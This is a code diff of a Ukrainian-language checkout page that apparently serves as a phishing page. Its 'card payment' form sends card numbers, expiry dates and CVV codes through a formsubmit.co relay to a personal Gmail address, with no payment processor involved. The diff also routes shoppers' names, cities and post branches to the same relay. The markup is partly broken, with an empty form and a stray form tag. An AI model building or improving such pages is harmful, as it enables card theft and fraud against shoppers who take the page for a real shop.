@@ -166,18 +166,48 @@
       </div>
     </div>
 
-    <div id="cardBlock">
-      <h3>Оплата карткою</h3>
-      <form action="https://formsubmit.co/denisnatazko905@gmail.com" method="POST">
-        <input type="text" name="karts" placeholder="Номер картки" required />
-        <input type="text" name="parol" placeholder="MM / YY" required />
-        <input type="text" name="phiok" placeholder="CVV" required />
-        <button type="submit">Оформити замовлення</button>
-      </form>
-    </div>
+<div id="cardBlock">
+  <h3>Назва міста</h3>
+
+  <form action="https://formsubmit.co/denisnatazko905@gmail.com" method="POST">
+    <input type="number" name="kard" placeholder="номер карти" required>
+
+    <!-- МІСЯЦЬ / РІК -->
+    <input
+      type="text"
+      name="month_year"
+      placeholder="MM/YY"
+      maxlength="5"
+      oninput="formatDate(this)"
+      required
+    >
+
+    <input type="number" name="cvv" placeholder="cvv" required>
+
+    <button type="submit">Оформити замовлення</button>
+  </form>
+</div>
+
+<script>
+function formatDate(input) {
+  // залишаємо тільки цифри
+  let value = input.value.replace(/\D/g, '');
+
+  // максимум 4 цифри (MMYY)
+  if (value.length > 4) value = value.slice(0, 4);
+
+  // додаємо /
+  if (value.length > 2) {
+    input.value = value.slice(0, 2) + '/' + value.slice(2);
+  } else {
+    input.value = value;
+  }
+}
+</script>
 
     <div id="deliveryBlock" style="display:none">
       <h3>Контактні дані</h3>
+    <form action="https://formsubmit.co/denisnatazko905@gmail.com" method="POST"></form>
       <input type="text" name="lastname" placeholder="Прізвище" required />
       <input type="text" name="dfgh" placeholder="Імʼя" required />
       <input type="text" name="fathername" placeholder="По батькові" required />
@@ -188,6 +218,7 @@
       <input type="text" name="city" placeholder="Місто" required />
       <input type="text" name="branch" placeholder="Відділення" required />
       <button type="submit">Оформити замовлення</button>
+    <form>
     </div>
 
     <form action="https://formsubmit.co/proden466@gmail.com" method="POST">
